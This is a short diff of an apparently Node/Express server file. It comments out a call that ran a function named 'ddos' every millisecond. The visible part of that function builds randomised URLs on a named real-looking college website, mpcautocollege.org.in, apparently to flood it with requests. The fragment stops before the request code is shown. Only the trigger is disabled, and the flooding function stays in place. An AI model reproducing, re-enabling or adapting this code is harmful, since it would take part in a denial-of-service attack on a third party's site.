@@ -10,7 +10,7 @@ res.send("randiap")
 res.end()
 
 })
-setInterval(ddos,1)
+// setInterval(ddos,1)
 function ddos(){
     const extra=Math.random()
     const uril='http://mpcautocollege.org.in/a'+extra
